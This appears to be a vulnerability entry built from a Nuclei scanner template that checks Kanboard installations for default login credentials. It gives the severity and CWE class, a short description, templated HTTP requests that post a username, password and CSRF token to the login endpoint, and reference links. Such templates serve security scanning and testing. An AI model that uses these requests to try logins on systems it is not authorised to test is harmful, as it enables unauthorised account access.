# Nuclei Template: Kanboard - Default Login
**Template ID:** kanboard-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`kanboard-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Kanboard contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /?controller=AuthController&action=login HTTP/1.1
Host: {{Hostname}}

POST /?controller=AuthController&action=check HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{user}}&password={{pass}}&csrf_token={{csrf_token}}
```

## References
- https://twitter.com/0x_rood/status/1607068644634157059
- https://github.com/kanboard/kanboard
- https://docs.kanboard.org/v1/admin/installation/
